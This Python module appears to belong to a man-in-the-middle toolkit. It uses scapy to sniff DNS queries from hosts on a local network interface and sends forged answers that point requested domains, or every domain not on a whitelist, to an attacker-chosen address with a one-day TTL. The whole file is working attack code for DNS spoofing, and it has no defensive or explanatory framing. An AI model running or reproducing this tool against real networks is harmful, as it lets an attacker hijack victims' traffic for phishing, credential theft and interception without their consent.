# Standard libraries

# Additional libraries
from scapy import packet
from scapy.arch import get_if_hwaddr
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

# Local libraries
from src.tools import get_mac_by_ip


def spoof(interface: str, settings: dict):
    print('DNS poisoning hosts on ' + interface + ' after requests are sent')
    hosts_dictionary: dict = settings['poisoned hosts'][interface]
    whitelist_hosts: dict = settings['whitelist poisoned hosts'][interface]
    whitelist_domains: dict = settings['whitelist spoofed domains'][interface]
    attacker_mac = get_if_hwaddr(interface)

    # Start poisoning
    def send_dns_poison(host_mac: str, host_ip: str, received_packet: packet):
        dnsrr = DNSRR()
        dnsrr[DNSRR].rrname = received_packet[DNSQR].qname
        dnsrr[DNSRR].type = 'A'
        dnsrr[DNSRR].rclass = received_packet[DNSQR].qclass
        dnsrr[DNSRR].ttl = 86400
        dnsrr[DNSRR].rdata = settings['redirect spoofed domains to']
        dns = Ether() / IP() / UDP() / DNS()
        dns[Ether].src = attacker_mac
        dns[Ether].dst = host_mac
        dns[IP].dst = host_ip
        dns[IP].src = received_packet[IP].dst
        dns[UDP].dport = received_packet[UDP].sport
        dns[UDP].sport = received_packet[UDP].dport
        dns[DNS].id = received_packet[DNS].id
        dns[DNS].ancount = 1
        dns[DNS].qr = 1
        dns[DNS].rd = 1
        dns[DNS].qd = received_packet[DNS].qd
        dns[DNS].an = dnsrr
        if settings['show debug']:
            dns.show()
        sendp(dns, iface=interface, verbose=settings['show debug'])
        if settings['show dns spoof']:
            print('Spoofed DNS request from ' + host_ip + ' for ' + dns[DNSQR].qname.decode()[: -1])

    def check_dns_callback(received_packet: packet, mac: str, ip: str):
        if mac == attacker_mac:
            return
        if mac in whitelist_hosts:
            if ip in whitelist_hosts[mac]:
                return
        dns = received_packet[DNS]
        if dns.opcode == 0 and dns.ancount == 0:
            target = received_packet[DNSQR].qname
            if settings['spoof all domains'] and target.decode()[: -1] not in whitelist_domains:
                send_dns_poison(mac, ip, received_packet)
            elif target.decode()[: -1] in settings['spoofed domains']:
                send_dns_poison(mac, ip, received_packet)

    def dns_callback(received_packet: packet):
        if DNS not in received_packet:
            return
        if UDP not in received_packet:
            return
        if IP not in received_packet:
            return
        src_ip = received_packet[IP].src
        if Ether in received_packet:
            src_mac = received_packet[Ether].src
        else:
            src_mac = get_mac_by_ip(src_ip, hosts_dictionary)
        check_dns_callback(received_packet, src_mac, src_ip)

    while not settings['interrupted']:
        sniff(iface=interface, prn=dns_callback, filter='udp port 53', store=0)
